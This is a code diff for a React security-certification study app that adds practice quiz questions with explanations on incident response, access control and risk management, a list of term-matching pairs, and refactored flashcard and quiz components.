+{q:"Which of the following evidence should be collected LAST during a forensic investigation of a powered-on system?",opts:["CPU registers","Running processes in memory","Swap file contents","Archived backup tapes from last month"],a:3,d:4,exp:"Archived backups are the LEAST volatile evidence — they exist on permanent media and will not change. Collect volatile evidence (CPU, RAM, swap) first."},
+{q:"A company's security policy requires that access to the ERP system be reviewed every 90 days. An auditor finds three accounts belonging to former employees still have active access. Which control FAILED?",opts:["Provisioning","Deprovisioning","User Access Review","Separation of Duties"],a:2,d:4,exp:"User Access Review is the periodic audit of existing permissions — it should catch and remove stale accounts from departed employees before they become a risk."},
+{q:"A help desk technician notices that a user's account has Read, Write, Execute, and Admin access to every folder on the file server — far beyond what their role requires. Over 3 years, the user changed departments twice but permissions were never reviewed. Which term BEST describes this situation?",opts:["Insider Threat","Separation of Duties violation","Privilege Creep","Over-provisioning error"],a:2,d:4,exp:"Privilege creep is the gradual accumulation of access rights beyond current role needs, typically happening as users change roles without having old access revoked."},
+{q:"An organization wants to test its incident response procedures, including communication plans, escalation paths, and decision-making, WITHOUT affecting any live systems. Which exercise type BEST fits?",opts:["Penetration Test","Red Team Engagement","Tabletop Exercise","Vulnerability Assessment"],a:2,d:4,exp:"Tabletop exercises are discussion-based simulations — teams walk through scenarios verbally without touching real systems. Perfect for testing procedures and communication."},
+{q:"During a forensic investigation, an analyst creates a SHA-256 hash of a drive image immediately after collection and stores it with the evidence. What is the PURPOSE of this action?",opts:["To compress the evidence for efficient storage","To prove the evidence was not altered after collection","To encrypt the evidence for chain of custody","To verify the drive image is bootable"],a:1,d:4,exp:"Hashing evidence immediately after collection creates a fingerprint — any later alteration would produce a different hash, proving tampering occurred."},
+{q:"A UEBA system flags an analyst's account for accessing 847 patient records at 2:00 AM, when the analyst typically works 9-5 and accesses an average of 12 records per day. What type of threat does UEBA MOST likely flag this as?",opts:["External Brute Force Attack","Malware Infection","Insider Threat or Compromised Account","DDoS Preparation"],a:2,d:4,exp:"UEBA baselines normal behavior patterns — 847 records at 2AM far deviates from the baseline, flagging either a compromised account or malicious insider activity."},
+{q:"A security team wants to verify that their EDR solution properly detects and isolates ransomware before it can encrypt more than 5 files. Which type of test BEST validates this?",opts:["Tabletop Exercise","Vulnerability Scan","Adversarial Simulation using safe ransomware samples","Penetration Test"],a:2,d:4,exp:"Adversarial simulation with safe (non-destructive) malware samples tests whether defensive controls actually work — more realistic than tabletop, safer than real ransomware."},
+{q:"An organization's legal team issues a hold order for all email communications involving a specific executive for the past 3 years. The IT team must preserve this data even if it exceeds the standard 90-day retention policy. Which term describes this obligation?",opts:["Chain of Custody","eDiscovery","Legal Hold","Data Classification"],a:2,d:4,exp:"A Legal Hold is a preservation order requiring organizations to retain relevant data beyond normal retention periods — deleting it could constitute evidence tampering."},
+{q:"A SOC analyst sees a SIEM alert: 'New local administrator account created' followed immediately by 'Antivirus disabled' and 'Scheduled task created' — all on the same workstation at 11:47 PM. What should the analyst do FIRST?",opts:["Email the workstation's owner to ask if they authorized the changes","Isolate the workstation from the network immediately","Create a ticket and wait for morning shift","Run a vulnerability scan on the workstation"],a:1,d:4,exp:"The sequence — new admin account, AV disabled, scheduled task — are classic ransomware/malware preparation steps. Immediate isolation (containment) prevents spread."},
+{q:"Which of the following BEST describes the difference between a Red Team and a standard penetration test?",opts:["Red Teams only test network security; pen tests include applications","Red Teams simulate full APT-style attacks using all vectors over extended time; pen tests have defined scope and time limits","Red Teams use automated tools; pen tests are manual","Red Teams test defensive controls; pen tests identify vulnerabilities"],a:1,d:4,exp:"Red Team engagements simulate sophisticated adversaries using all attack methods (physical, social, digital) over months. Pen tests have specific scope, rules, and time limits."},
+{q:"An access control system uses a combination of the user's job title, their current physical location (in the building vs remote), the time of day, and the resource's sensitivity level to grant or deny access. Which access control model is in use?",opts:["RBAC","DAC","MAC","ABAC"],a:3,d:4,exp:"ABAC (Attribute-Based Access Control) grants access based on multiple attributes simultaneously — job title + location + time + resource sensitivity all combined."},
+{q:"A security team implements a control that allows developers to temporarily elevate their privileges to deploy code to production, but the elevated access automatically expires after 2 hours and is fully logged. Which principle does this BEST represent?",opts:["Separation of Duties","Least Privilege with Just-in-Time Access","Dual Control","Mandatory Access Control"],a:1,d:4,exp:"JIT Access with Least Privilege — temporary, time-bound elevation only when needed with automatic revocation. This minimizes the window of excess privilege."},
+{q:"A threat hunter discovers that an attacker has been using legitimate administrative tools (PowerShell, WMI, PsExec) to move laterally through the network without dropping any malware files. Which threat type BEST describes this?",opts:["Rootkit","Fileless Malware / Living-off-the-Land Attack","Advanced Persistent Threat","Logic Bomb"],a:1,d:4,exp:"Living-off-the-land attacks use legitimate built-in tools to avoid detection — no malicious files are written to disk, making signature-based detection ineffective."},
+{q:"A developer accidentally pushes production database credentials to a public GitHub repository. The repository has been public for approximately 3 minutes. Which action should be taken FIRST?",opts:["Delete the repository immediately","Remove the credentials from the commit history","Rotate and revoke the exposed credentials immediately","Notify the development team lead"],a:2,d:4,exp:"Automated bots scan GitHub for exposed credentials within seconds. Revoking credentials immediately (containment) is always the first step — deletion alone cannot unexpose already-scraped credentials."},
+{q:"An organization conducts a post-incident review and discovers that the IR team did not have pre-written playbooks, causing significant delay in response. Which IR phase does improving this address?",opts:["Detection & Analysis","Containment","Recovery","Preparation"],a:3,d:4,exp:"Preparation is the IR phase focused on building capability BEFORE incidents — playbooks, training, tools, and communication plans are all Preparation activities."},
+{q:"A full disk encryption solution is implemented on all laptops. An executive's laptop is stolen from an airport. Which threat does FDE MOST effectively protect against?",opts:["Remote malware installation","Unauthorized access to data if the laptop is powered off","Shoulder surfing in public places","Man-in-the-Middle attacks on public Wi-Fi"],a:1,d:4,exp:"FDE protects data at rest — if the laptop is stolen and powered off, the encrypted drive is unreadable without the decryption key. It does not protect against network-based attacks."},
+{q:"A penetration tester discovers an RCE vulnerability but the rules of engagement prohibit exploiting production systems. The tester has created a working PoC exploit. What should the tester do NEXT?",opts:["Test the exploit in a lab environment to confirm it works","Immediately exploit the production system to demonstrate impact","Document the vulnerability with evidence and report it per the rules of engagement","Wait until the full assessment is complete to report it comprehensively"],a:2,d:4,exp:"Rules of engagement are binding — the tester must stay within authorized scope. Document with sufficient evidence (CVE, version numbers, PoC code) and escalate immediately without exploiting production."},
+{q:"Which of the following actions is performed during the Eradication phase of incident response?",opts:["Isolating compromised systems from the network","Restoring systems from clean backups","Removing malware and patching the exploited vulnerability","Documenting findings and updating playbooks"],a:2,d:4,exp:"Eradication = REMOVE the threat. Isolation is Containment, restoration is Recovery, and documentation is Lessons Learned."},
+{q:"A SOC analyst receives an alert that a user downloaded a file named 'Q3_Report.pdf.exe'. The file has a PDF icon. Which social engineering technique makes this effective?",opts:["Pretexting","Icon Spoofing / File Extension Masquerading","Baiting","Vishing"],a:1,d:4,exp:"Disguising an executable as a PDF using a fake icon and double extension is file masquerading — exploiting users who don't show file extensions or who trust the icon."},
+// Domain 5 — 13 questions
+{q:"A security team calculates that a data breach has an Asset Value of $500,000, an Exposure Factor of 40%, and an ARO of 0.25. What is the Annual Loss Expectancy?",opts:["$200,000","$50,000","$125,000","$500,000"],a:1,d:5,exp:"SLE = $500,000 × 0.40 = $200,000. ALE = SLE × ARO = $200,000 × 0.25 = $50,000. The answer is $50,000."},
+{q:"A company processes EU citizens' personal data. A data breach exposing this data must be reported to the supervisory authority within how many hours under GDPR?",opts:["24 hours","48 hours","72 hours","7 days"],a:2,d:5,exp:"GDPR Article 33 requires breach notification to the supervisory authority within 72 hours of becoming aware of the breach — unless the breach is unlikely to result in risk."},
+{q:"An organization decides to stop storing customer credit card numbers after determining the storage cost and risk outweigh the business benefit. Which risk response is this?",opts:["Risk Mitigation","Risk Transference","Risk Acceptance","Risk Avoidance"],a:3,d:5,exp:"Risk Avoidance eliminates the risky activity entirely — by not storing card numbers, the organization removes the risk completely rather than reducing or transferring it."},
+{q:"A vendor contract includes a clause requiring the vendor to notify the organization within 24 hours of any security incident, undergo annual security audits, and maintain SOC 2 Type II certification. These requirements are BEST described as:",opts:["SLA terms","Supply chain risk management controls","NDA obligations","GDPR compliance requirements"],a:1,d:5,exp:"Requiring security notifications, audit rights, and certifications in vendor contracts is supply chain risk management — controlling third-party risk through contractual obligations."},
+{q:"An organization's risk register shows a vulnerability with a CVSS score of 9.8. The affected system stores only public marketing materials with no sensitive data. How should this be prioritized?",opts:["Immediately patch — CVSS 9.8 is always critical regardless of context","Prioritize based on CVSS score AND business impact — the low data sensitivity may lower actual risk","Ignore it since the data is public anyway","Escalate to regulators immediately"],a:1,d:5,exp:"Risk prioritization must consider both the technical severity (CVSS) AND the business context (data sensitivity, system criticality). A 9.8 on a low-value system may rank below a 7.0 on a critical system."},
+{q:"A company purchases cyber liability insurance to cover financial losses from a data breach. Which risk response does this represent?",opts:["Risk Avoidance","Risk Mitigation","Risk Acceptance","Risk Transference"],a:3,d:5,exp:"Risk Transference shifts the financial burden of a risk to a third party — cyber insurance is the classic example. The risk still exists but another party bears the financial consequences."},
+{q:"A compliance officer is reviewing HIPAA requirements for a new electronic health records system. HIPAA requires protection of:",opts:["All personal data of US citizens","Protected Health Information (PHI) of patients","Financial records of healthcare organizations","Research data published in medical journals"],a:1,d:5,exp:"HIPAA protects PHI (Protected Health Information) — any individually identifiable health information created, received, or maintained by covered healthcare entities."},
+{q:"An organization's security team documents the processes used to investigate a breach, update firewall rules, and train staff. This activity occurs AFTER the incident is resolved. Which framework activity does this BEST represent?",opts:["NIST CSF — Identify","NIST CSF — Protect","NIST CSF — Respond","NIST CSF — Recover"],a:3,d:5,exp:"NIST CSF's Recover function includes post-incident activities — restoring capabilities and improving based on lessons learned. 'Respond' is the active response; 'Recover' includes improvement."},
+{q:"A financial services company wants to assess the qualitative impact of losing its primary trading platform for 8 hours. Which analysis method is MOST appropriate?",opts:["Quantitative Risk Analysis using ALE","Qualitative Risk Analysis using High/Medium/Low ratings","Business Impact Analysis (BIA)","Penetration Testing"],a:2,d:5,exp:"BIA (Business Impact Analysis) identifies critical processes and quantifies the impact of their disruption — it is specifically designed to assess operational impact of outages."},
+{q:"An organization is audited and found non-compliant with PCI DSS requirements. Which action would MOST directly achieve compliance?",opts:["Implementing ISO 27001 certification","Applying the specific technical and administrative controls required by PCI DSS","Purchasing cyber liability insurance","Conducting annual penetration tests only"],a:1,d:5,exp:"PCI DSS compliance requires implementing the specific controls defined in the standard — network segmentation, encryption, access controls, monitoring, and testing requirements."},
+{q:"A CISO is classifying a new database containing employee salaries, performance reviews, and medical leave records. Which classification level is MOST appropriate?",opts:["Public","Internal","Confidential","Restricted / Top Secret"],a:2,d:5,exp:"Confidential data includes sensitive business information like employee records, HR data, and financial details — disclosure would cause significant harm but it's not the most highly classified."},
+{q:"A company's data retention policy requires deleting customer records after 7 years. The legal team issues a hold order for a specific customer's records related to pending litigation. Which takes precedence?",opts:["The retention policy — policies override legal holds","The legal hold — legal obligations override internal policies","Whichever was created first","It depends on the data classification level"],a:1,d:5,exp:"Legal holds always take precedence over internal retention policies — deleting records under a legal hold could constitute obstruction of justice or evidence tampering."},
+{q:"An organization's security policy prohibits storing sensitive data on personal devices. An employee emails themselves a spreadsheet with 2,000 customer records to work from home. Which policy has been violated?",opts:["Change Management Policy","Acceptable Use Policy","Clean Desk Policy","Data Retention Policy"],a:1,d:5,exp:"The Acceptable Use Policy (AUP) governs how employees may use organizational systems and data — emailing sensitive data to a personal account violates AUP data handling rules."},
 ];
 
-const MATCH_PAIRS = [
-  { term: "SYN Flood", match: "Half-open TCP connections exhaust server" },
-  { term: "Evil Twin", match: "Fake AP with identical SSID to real network" },
-  { term: "Rootkit", match: "Hides in kernel, evades antivirus" },
-  { term: "Cryptojacking", match: "Uses your CPU to mine cryptocurrency" },
-  { term: "Whaling", match: "Phishing targeting executives" },
-  { term: "RTO", match: "Maximum acceptable downtime" },
-  { term: "RPO", match: "Maximum acceptable data loss in time" },
-  { term: "UEBA", match: "Detects impossible travel anomalies" },
-  { term: "Kerberos", match: "Ticket-based auth using KDC" },
-  { term: "SAML", match: "Enterprise SSO federation between orgs" },
-  { term: "IDS", match: "Monitors and alerts — does NOT block" },
-  { term: "IPS", match: "Monitors and BLOCKS inline traffic" },
+// ── 36 MATCH PAIRS ────────────────────────────────────────────────────────────
+const MATCH_PAIRS=[
+  {term:"SYN Flood",match:"Half-open TCP connections exhaust server"},
+  {term:"Evil Twin",match:"Fake AP with identical SSID to real network"},
+  {term:"Rootkit",match:"Hides in kernel, evades antivirus tools"},
+  {term:"Cryptojacking",match:"Uses your CPU to mine cryptocurrency"},
+  {term:"Whaling",match:"Spear phishing targeting executives"},
+  {term:"RTO",match:"Maximum acceptable downtime"},
+  {term:"RPO",match:"Maximum acceptable data loss in time"},
+  {term:"UEBA",match:"Detects behavioral anomalies like impossible travel"},
+  {term:"Kerberos",match:"Ticket-based auth using KDC"},
+  {term:"SAML",match:"Enterprise SSO federation between organizations"},
+  {term:"IDS",match:"Monitors and alerts — does NOT block traffic"},
+  {term:"IPS",match:"Monitors and BLOCKS malicious traffic inline"},
+  {term:"TACACS+",match:"Separates AAA into three functions, uses TCP"},
+  {term:"RADIUS",match:"Centralized auth for VPN and Wi-Fi, uses UDP"},
+  {term:"Salting",match:"Defeats rainbow table attacks on hashes"},
+  {term:"PFS",match:"Unique session keys protect past sessions"},
+  {term:"DAC",match:"Resource owner decides who gets access"},
+  {term:"MAC",match:"System enforces labels and clearances"},
+  {term:"ABAC",match:"Access based on multiple attributes"},
+  {term:"ALE",match:"SLE multiplied by Annual Rate of Occurrence"},
+  {term:"Hot Site",match:"Fully operational, real-time sync, highest cost"},
+  {term:"Cold Site",match:"Empty facility, equipment needed, lowest cost"},
+  {term:"SOAR",match:"Automates incident response playbooks"},
+  {term:"EDR",match:"Detects and responds to endpoint threats"},
+  {term:"JIT Access",match:"Temporary elevated access, auto-revoked after task"},
+  {term:"Pass-the-Hash",match:"Reuses NTLM hash without cracking password"},
+  {term:"Replay Attack",match:"Captured token retransmitted at a later time"},
+  {term:"Session Hijacking",match:"Takes over an active live authenticated session"},
+  {term:"CASB",match:"Monitors and controls cloud app usage"},
+  {term:"WAF",match:"Protects web apps against SQLi and XSS at Layer 7"},
+  {term:"Honeypot",match:"Decoy system designed to attract attackers"},
+  {term:"Legal Hold",match:"Preservation order preventing data deletion"},
+  {term:"Chain of Custody",match:"Documents who handled evidence and when"},
+  {term:"Privilege Creep",match:"Accumulated permissions beyond current role"},
+  {term:"Supply Chain Attack",match:"Compromising a vendor to attack downstream targets"},
+  {term:"Risk Transference",match:"Cyber insurance shifts financial risk to third party"},
 ];
 
-// ─── STYLES ───────────────────────────────────────────────────────────────────
+// ── STYLES ────────────────────────────────────────────────────────────────────
+const C={card:{background:"#0a1525",border:"1px solid #1e293b",borderRadius:16,padding:"18px 16px"},primary:{background:"#00d4ff",color:"#000814",border:"none",borderRadius:12,padding:"14px 20px",fontWeight:700,fontFamily:"inherit",fontSize:15,width:"100%",minHeight:50,cursor:"pointer"},back:{background:"transparent",border:"none",color:"#64748b",fontFamily:"inherit",fontSize:14,padding:"0 0 16px 0",display:"flex",alignItems:"center",gap:6,cursor:"pointer"}};
+const chip=(on,col)=>({flexShrink:0,border:`1px solid ${on?col:"#1e293b"}`,background:on?col+"22":"#0a1525",color:on?col:"#64748b",borderRadius:20,padding:"6px 14px",fontSize:12,cursor:"pointer",fontFamily:"inherit",fontWeight:600});
 
-const card = { background: "#0a1525", border: "1px solid #1e293b", borderRadius: 16, padding: "18px 16px" };
-const primaryBtn = { background: "#00d4ff", color: "#000814", border: "none", borderRadius: 12, padding: "14px 20px", fontWeight: 700, fontFamily: "inherit", fontSize: 15, width: "100%", minHeight: 50, cursor: "pointer" };
-const backBtn = { background: "transparent", border: "none", color: "#64748b", fontFamily: "inherit", fontSize: 14, padding: "0 0 16px 0", display: "flex", alignItems: "center", gap: 6, cursor: "pointer" };
-
-function chipStyle(active, color) {
-  return { flexShrink: 0, border: `1px solid ${active ? color : "#1e293b"}`, background: active ? color + "22" : "#0a1525", color: active ? color : "#64748b", borderRadius: 20, padding: "6px 14px", fontSize: 12, cursor: "pointer", fontFamily: "inherit", fontWeight: 600 };
-}
-
-// ─── FLASHCARDS ───────────────────────────────────────────────────────────────
-
-function Flashcards() {
-  const [domain, setDomain] = useState(0);
-  const [idx, setIdx] = useState(0);
-  const [flipped, setFlipped] = useState(false);
-  const [known, setKnown] = useState([]);
-  const [review, setReview] = useState([]);
-
-  const cards = domain === 0 ? FLASHCARDS : FLASHCARDS.filter(c => c.domain === domain);
-  const card_ = cards[idx];
-  const done = known.length + review.length === cards.length;
-  const reset = () => { setIdx(0); setFlipped(false); setKnown([]); setReview([]); };
-
-  const next = (result) => {
-    if (result === "know") setKnown(p => [...p, card_.term]);
-    else setReview(p => [...p, card_.term]);
-    setFlipped(false);
-    setTimeout(() => { if (idx + 1 < cards.length) setIdx(i => i + 1); }, 100);
+// ── FLASHCARDS ────────────────────────────────────────────────────────────────
+function Flashcards(){
+  const [dom,setDom]=useState(0);
+  const [idx,setIdx]=useState(0);
+  const [flip,setFlip]=useState(false);
+  const [known,setKnown]=useState([]);
+  const [rev,setRev]=useState([]);
+  const cards=dom===0?FLASHCARDS:FLASHCARDS.filter(c=>c.domain===dom);
+  const card=cards[idx];
+  const done=known.length+rev.length===cards.length;
+  const reset=()=>{setIdx(0);setFlip(false);setKnown([]);setRev([]);};
+  const next=(r)=>{
+    if(r==="k")setKnown(p=>[...p,card.term]);else setRev(p=>[...p,card.term]);
+    setFlip(false);
+    setTimeout(()=>{if(idx+1<cards.length)setIdx(i=>i+1);},100);
   };
-
-  return (
-    <div style={{ padding: "16px 16px 100px" }}>
-      <h2 style={{ fontFamily: "Syne, sans-serif", fontSize: 22, marginBottom: 16, color: "#f1f5f9" }}>🃏 Flashcards</h2>
-      <div className="scroll-x" style={{ marginBottom: 16 }}>
-        {[{ id: 0, name: "All", color: "#00d4ff" }, ...DOMAINS.map(d => ({ ...d, name: `D${d.id}` }))].map(d => (
-          <button key={d.id} onClick={() => { setDomain(d.id); reset(); }} style={chipStyle(domain === d.id, d.color)}>{d.name}</button>
+  return(
+    <div style={{padding:"16px 16px 100px"}}>
+      <h2 style={{fontFamily:"Syne,sans-serif",fontSize:22,marginBottom:16,color:"#f1f5f9"}}>🃏 Flashcards <span style={{fontSize:13,color:"#475569",fontFamily:"inherit",fontWeight:400}}>({FLASHCARDS.length} cards)</span></h2>
+      <div className="sx" style={{marginBottom:16}}>
+        {[{id:0,name:"All",color:"#00d4ff"},...DOMAINS.map(d=>({...d,name:`D${d.id}`}))].map(d=>(
+          <button key={d.id} onClick={()=>{setDom(d.id);reset();}} style={chip(dom===d.id,d.color)}>{d.name}</button>
         ))}
       </div>
-
-      {!done ? (
+      {!done?(
         <>
-          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8, fontSize: 12, color: "#475569" }}>
-            <span>{idx + 1} / {cards.length}</span>
-            <span><span style={{ color: "#22c55e" }}>✓ {known.length}</span> · <span style={{ color: "#ef4444" }}>✗ {review.length}</span></span>
+          <div style={{display:"flex",justifyContent:"space-between",marginBottom:8,fontSize:12,color:"#475569"}}>
+            <span>{idx+1}/{cards.length}</span>
+            <span><span style={{color:"#22c55e"}}>✓{known.length}</span>·<span style={{color:"#ef4444"}}>✗{rev.length}</span></span>
           </div>
-          <div style={{ height: 4, background: "#1e293b", borderRadius: 2, marginBottom: 20 }}>
-            <div style={{ height: "100%", width: `${((known.length + review.length) / cards.length) * 100}%`, background: "#00d4ff", borderRadius: 2, transition: "width 0.3s" }} />
+          <div style={{height:4,background:"#1e293b",borderRadius:2,marginBottom:20}}>
+            <div style={{height:"100%",width:`${((known.length+rev.length)/cards.length)*100}%`,background:"#00d4ff",borderRadius:2,transition:"width .3s"}}/>
           </div>
-          <div onClick={() => setFlipped(f => !f)} style={{
-            ...card, minHeight: 220, display: "flex", flexDirection: "column", alignItems: "center",
-            justifyContent: "center", textAlign: "center", cursor: "pointer", userSelect: "none",
-            background: flipped ? "linear-gradient(135deg,#0d2d1a,#0a1f2d)" : "linear-gradient(135deg,#0a1f2d,#0d1f35)",
-            borderColor: flipped ? "#06d6a0" : "#00d4ff", transition: "all 0.25s",
-          }}>
-            <div style={{ fontSize: 11, color: flipped ? "#06d6a0" : "#00d4ff", letterSpacing: 2, textTransform: "uppercase", marginBottom: 14 }}>
-              {flipped ? "Definition" : "Tap to reveal"}
-            </div>
-            <div style={{ fontSize: flipped ? 14 : 22, fontWeight: flipped ? 400 : 700, color: "#f1f5f9", lineHeight: 1.7, fontFamily: flipped ? "inherit" : "Syne, sans-serif" }}>
-              {flipped ? card_.def : card_.term}
-            </div>
-            {!flipped && <div style={{ marginTop: 12, fontSize: 11, color: "#334155" }}>Domain {card_.domain}</div>}
+          <div onClick={()=>setFlip(f=>!f)} style={{...C.card,minHeight:220,display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",textAlign:"center",cursor:"pointer",userSelect:"none",background:flip?"linear-gradient(135deg,#0d2d1a,#0a1f2d)":"linear-gradient(135deg,#0a1f2d,#0d1f35)",borderColor:flip?"#06d6a0":"#00d4ff",transition:"all .25s"}}>
+            <div style={{fontSize:11,color:flip?"#06d6a0":"#00d4ff",letterSpacing:2,textTransform:"uppercase",marginBottom:14}}>{flip?"Definition":"Tap to reveal"}</div>
+            <div style={{fontSize:flip?13:21,fontWeight:flip?400:700,color:"#f1f5f9",lineHeight:1.7,fontFamily:flip?"inherit":"Syne,sans-serif"}}>{flip?card.def:card.term}</div>
+            {!flip&&<div style={{marginTop:12,fontSize:11,color:"#334155"}}>Domain {card.domain}</div>}
           </div>
-          {flipped ? (
-            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginTop: 16 }}>
-              <button onClick={() => next("review")} style={{ background: "#2d0a0a", border: "1px solid #ef4444", borderRadius: 12, padding: 14, color: "#fca5a5", fontFamily: "inherit", fontSize: 14, fontWeight: 700, minHeight: 52, cursor: "pointer" }}>✗ Still Learning</button>
-              <button onClick={() => next("know")} style={{ background: "#052e16", border: "1px solid #22c55e", borderRadius: 12, padding: 14, color: "#86efac", fontFamily: "inherit", fontSize: 14, fontWeight: 700, minHeight: 52, cursor: "pointer" }}>✓ Got It!</button>
+          {flip?(
+            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginTop:16}}>
+              <button onClick={()=>next("r")} style={{background:"#2d0a0a",border:"1px solid #ef4444",borderRadius:12,padding:14,color:"#fca5a5",fontFamily:"inherit",fontSize:14,fontWeight:700,minHeight:52,cursor:"pointer"}}>✗ Still Learning</button>
+              <button onClick={()=>next("k")} style={{background:"#052e16",border:"1px solid #22c55e",borderRadius:12,padding:14,color:"#86efac",fontFamily:"inherit",fontSize:14,fontWeight:700,minHeight:52,cursor:"pointer"}}>✓ Got It!</button>
             </div>
-          ) : <p style={{ textAlign: "center", color: "#334155", fontSize: 13, marginTop: 16 }}>Tap card to flip</p>}
+          ):<p style={{textAlign:"center",color:"#334155",fontSize:13,marginTop:16}}>Tap card to flip</p>}
         </>
-      ) : (
-        <div style={{ ...card, textAlign: "center", padding: 32 }}>
-          <div style={{ fontSize: 48, marginBottom: 12 }}>🎯</div>
-          <div style={{ fontFamily: "Syne, sans-serif", fontSize: 22, color: "#f1f5f9", marginBottom: 8 }}>Deck Complete!</div>
-          <div style={{ fontSize: 14, color: "#64748b", marginBottom: 24 }}><span style={{ color: "#22c55e" }}>{known.length} known</span> · <span style={{ color: "#ef4444" }}>{review.length} to review</span></div>
-          {review.length > 0 && <div style={{ background: "#0d0a14", border: "1px solid #2d1a1a", borderRadius: 12, padding: 14, marginBottom: 20, textAlign: "left" }}>
-            <div style={{ fontSize: 11, color: "#ef4444", letterSpacing: 1, textTransform: "uppercase", marginBottom: 8 }}>Review These</div>
-            {review.map(t => <div key={t} style={{ fontSize: 13, color: "#94a3b8", marginBottom: 4 }}>• {t}</div>)}
-          </div>}
-          <button onClick={reset} style={primaryBtn}>Study Again</button>
+      ):(
+        <div style={{...C.card,textAlign:"center",padding:32}}>
+          <div style={{fontSize:48,marginBottom:12}}>🎯</div>
+          <div style={{fontFamily:"Syne,sans-serif",fontSize:22,color:"#f1f5f9",marginBottom:8}}>Deck Complete!</div>
+          <div style={{fontSize:14,color:"#64748b",marginBottom:24}}><span style={{color:"#22c55e"}}>{known.length} known</span> · <span style={{color:"#ef4444"}}>{rev.length} review</span></div>
+          {rev.length>0&&<div style={{background:"#0d0a14",border:"1px solid #2d1a1a",borderRadius:12,padding:14,marginBottom:20,textAlign:"left"}}><div style={{fontSize:11,color:"#ef4444",letterSpacing:1,textTransform:"uppercase",marginBottom:8}}>Review These</div>{rev.map(t=><div key={t} style={{fontSize:13,color:"#94a3b8",marginBottom:4}}>• {t}</div>)}</div>}
+          <button onClick={reset} style={C.primary}>Study Again</button>
         </div>
       )}
     </div>
   );
 }
 
-// ─── QUIZ ─────────────────────────────────────────────────────────────────────
-
-function Quiz() {
-  const [dFilter, setDFilter] = useState(0);
-  const [cur, setCur] = useState(0);
-  const [sel, setSel] = useState(null);
-  const [answers, setAnswers] = useState([]);
-  const [done, setDone] = useState(false);
-
-  const questions = dFilter === 0 ? QUIZ : QUIZ.filter(q => q.d === dFilter);
-  const q = questions[cur];
-  const score = answers.filter(a => a.correct).length;
-
-  const pick = (i) => {
-    if (sel !== null) return;
+// ── QUIZ ─────────────────────────────────────────────────────────────────────
+function Quiz(){
+  const [df,setDf]=useState(0);
+  const [cur,setCur]=useState(0);
+  const [sel,setSel]=useState(null);
+  const [ans,setAns]=useState([]);
+  const [done,setDone]=useState(false);
+  const qs=df===0?QUIZ:QUIZ.filter(q=>q.d===df);
+  const q=qs[cur];
+  const score=ans.filter(a=>a.c).length;
+  const pick=(i)=>{
+    if(sel!==null)return;
     setSel(i);
-    setAnswers(a => [...a, { correct: i === q.a, domain: q.d }]);
+    setAns(a=>[...a,{c:i===q.a,d:q.d}]);
   };
-
-  const next = () => {
+  const next=()=>{
     setSel(null);
-    if (cur + 1 < questions.length) setCur(c => c + 1);
-    else setDone(true);
+    if(cur+1<qs.length)setCur(c=>c+1);else setDone(true);
   };
-
-  const reset = () => { setCur(0); setSel(null); setAnswers([]); setDone(false); };
-
-  if (done) {
-    const pct = Math.round((score / questions.length) * 100);
-    return (
-      <div style={{ padding: "16px 16px 100px" }}>
-        <h2 style={{ fontFamily: "Syne, sans-serif", fontSize: 22, marginBottom: 20, color: "#f1f5f9" }}>Results</h2>
-        <div style={{ ...card, textAlign: "center", marginBottom: 16 }}>
-          <div style={{ fontSize: 52, marginBottom: 8 }}>{pct >= 80 ? "🏆" : pct >= 60 ? "💪" : "📚"}</div>
-          <div style={{ fontFamily: "Syne, sans-serif", fontSize: 36, fontWeight: 800, color: pct >= 80 ? "#22c55e" : pct >= 60 ? "#f9c74f" : "#ef4444" }}>{pct}%</div>
-          <div style={{ fontSize: 14, color: "#64748b", marginTop: 4 }}>{score} / {questions.length} correct</div>
-          <div style={{ fontSize: 13, color: "#334155", marginTop: 6 }}>{pct >= 80 ? "Exam ready! 🎯" : pct >= 60 ? "Getting there — keep drilling 💪" : "Review notes and try again 📚"}</div>
+  const reset=()=>{setCur(0);setSel(null);setAns([]);setDone(false);};
+  if(done){
+    const pct=Math.round((score/qs.length)*100);
+    return(
+      <div style={{padding:"16px 16px 100px"}}>
+        <h2 style={{fontFamily:"Syne,sans-serif",fontSize:22,marginBottom:20,color:"#f1f5f9"}}>Results</h2>
+        <div style={{...C.card,textAlign:"center",marginBottom:16}}>
+          <div style={{fontSize:52,marginBottom:8}}>{pct>=80?"🏆":pct>=60?"💪":"📚"}</div>
+          <div style={{fontFamily:"Syne,sans-serif",fontSize:36,fontWeight:800,color:pct>=80?"#22c55e":pct>=60?"#f9c74f":"#ef4444"}}>{pct}%</div>
+          <div style={{fontSize:14,color:"#64748b",marginTop:4}}>{score}/{qs.length} correct</div>
+          <div style={{fontSize:13,color:"#334155",marginTop:6}}>{pct>=80?"Exam ready! 🎯":pct>=60?"Keep drilling! 💪":"Review notes and retry 📚"}</div>
         </div>
-        <div style={{ ...card, marginBottom: 16 }}>
-          <div style={{ fontSize: 11, color: "#475569", letterSpacing: 1, textTransform: "uppercase", marginBottom: 12 }}>By Domain</div>
-          {DOMAINS.map(d => {
-            const da = answers.filter(a => a.domain === d.id);
-            if (!da.length) return null;
-            const dc = da.filter(a => a.correct).length;
-            const dp = Math.round((dc / da.length) * 100);
-            return (
-              <div key={d.id} style={{ marginBottom: 12 }}>
-                <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
-                  <span style={{ fontSize: 12, color: "#94a3b8" }}>D{d.id}: {d.name.split(",")[0]}</span>
-                  <span style={{ fontSize: 12, fontWeight: 700, color: dp >= 70 ? "#22c55e" : dp >= 50 ? "#f9c74f" : "#ef4444" }}>{dp}%</span>
-                </div>
-                <div style={{ height: 4, background: "#1e293b", borderRadius: 2 }}>
-                  <div style={{ height: "100%", width: `${dp}%`, background: d.color, borderRadius: 2, transition: "width 0.5s" }} />
-                </div>
+        <div style={{...C.card,marginBottom:16}}>
+          <div style={{fontSize:11,color:"#475569",letterSpacing:1,textTransform:"uppercase",marginBottom:12}}>By Domain</div>
+          {DOMAINS.map(d=>{
+            const da=ans.filter(a=>a.d===d.id);
+            if(!da.length)return null;
+            const dc=da.filter(a=>a.c).length;
+            const dp=Math.round((dc/da.length)*100);
+            return(<div key={d.id} style={{marginBottom:12}}>
+              <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
+                <span style={{fontSize:12,color:"#94a3b8"}}>D{d.id}: {d.name.substring(0,22)}</span>
